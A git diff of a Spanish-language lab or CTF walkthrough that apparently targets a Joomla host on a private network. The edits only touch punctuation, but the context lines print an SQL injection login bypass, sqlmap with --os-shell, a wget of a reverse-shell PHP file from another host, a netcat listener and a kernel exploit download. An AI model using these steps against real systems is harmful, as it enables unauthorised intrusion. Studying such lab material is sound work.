@@ -42,7 +42,7 @@ URL del servidor: `http://192.168.25.131`
 
 ![5](https://user-images.githubusercontent.com/75953873/182724778-d685a545-04c9-4e41-8a49-3058067bc121.png)
 
-- *Paso 4:* Bypassear página con inyección SQL manual. 
+- *Paso 4:* Bypassear login con inyección SQL manual. 
 
 Username: `' or 1=1--'`
 
@@ -105,7 +105,7 @@ sqlmap --url 'http://192.168.25.131:666/index.php?option=com_abc&view=abc&letter
 ```
 ![15](https://user-images.githubusercontent.com/75953873/182728721-92cf4596-2d56-4614-88c3-30419f27d7d7.png)
 
-- *Paso 8:* Subir una shell a la base de datos `joomla`:
+- *Paso 8:* Subir una shell a la base de datos `joomla`.
 ```
 sqlmap --url 'http://192.168.25.131:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3' -D joomla --os-shell --batch
 ```
@@ -138,7 +138,7 @@ wget http://192.168.1.9/reverseshell.php
 ```
 ![19](https://user-images.githubusercontent.com/75953873/182731485-6dd80b89-38fe-4aa6-a2c1-de63078be636.png)
 
-- *Paso 9:* Poner a escucha conexiones con Netcat:
+- *Paso 9:* Poner a escucha conexiones con Netcat.
 ```
 nc -lvp 4444
 ``` 
@@ -148,7 +148,7 @@ URL: `http://192.168.25.131:666/reverseshell.php`
 
 ![21](https://user-images.githubusercontent.com/75953873/182731893-d0f3e803-277c-422d-b78c-fd9f8c22c66d.png)
 
-- *Paso 10:* Identificar versión del kernel y descargar exploit:
+- *Paso 10:* Identificar versión del kernel y descargar exploit.
 
 ![22](https://user-images.githubusercontent.com/75953873/182732251-c05c0ba1-7e2e-4da5-a75c-8676435d3a96.png)
 
